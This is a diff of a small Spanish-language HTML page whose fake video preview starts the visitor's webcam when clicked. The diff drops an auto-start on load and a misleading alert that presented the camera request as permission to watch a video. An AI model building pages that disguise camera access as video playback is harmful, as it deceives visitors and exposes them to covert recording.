@@ -52,7 +52,7 @@
 <body>
     <div class="warning">GUARDANDO VIDEO</div>
     <div id="container" onclick="startWebcam()">
-        <!-- Cambia 'vista-previa.jpg' por el nombre de tu imagen -->
+        <!-- Cambia 'vista-previa.jpeg' por el nombre de tu imagen -->
         <img id="previewImage" src="vista-previa.jpeg" alt="Vista previa del video">
         <video id="video" autoplay style="display: none;"></video>
     </div>
@@ -74,11 +74,9 @@
                 previewImage.style.display = 'none';
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
-                alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
+                alert('No se pudo acceder a la cámara. Asegúrate de haber dado permiso.');
             }
         }
-
-        window.addEventListener('load', startWebcam);
     </script>
 </body>
 </html>
